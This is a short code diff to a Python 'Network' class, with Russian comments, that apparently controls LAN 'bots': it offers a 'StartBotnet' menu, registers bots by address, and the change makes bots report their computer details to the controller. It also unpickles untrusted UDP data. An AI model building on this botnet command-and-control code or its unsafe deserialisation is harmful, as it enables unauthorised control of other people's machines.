@@ -74,15 +74,15 @@ class Network:
             try:
                 data, addr = server_socket.recvfrom(1024)
                 message = pickle.loads(data)
-                if addr[0] not in self.bots and message == True:
-                    self.bots[addr[0]] = {"Status": False, "Data": None}
+                if addr[0] not in self.bots and message["Status"] is True:
+                    self.bots[addr[0]] = {"name": addr[1], "Status": False, "PC": message["PC"], "Data": None}
                     print("Получено сообщение от {0}: {1}".format(addr, message))
             except socket.timeout:
                 print("Таймаут - больше нет сообщений")
                 break
 
     def __Info(self):
-        return "#########Choice#########\n" \
+        return "#########Choice##########\n" \
                "#(1)    CheckInLan   (1)#\n" \
                "#(2)  FindBotsInLan  (2)#\n" \
                "#(3)   StartBotnet   (3)#\n" \
@@ -203,7 +203,8 @@ class Network:
             print("Получено сообщение от {0}: {1}".format(addr, data))  # выводим данные
             match data["Action"]:
                 case "Auth":
-                    server_socket.sendto(pickle.dumps(True), (self.server, int(self.port)))
+                    server_socket.sendto(pickle.dumps({"Status": True, "PC": self.MyComputer()}),
+                                         (self.server, int(self.port)))
                 case "BotEnd":
                     print("Command BE - BotNet stopped!")
                     exit(6)
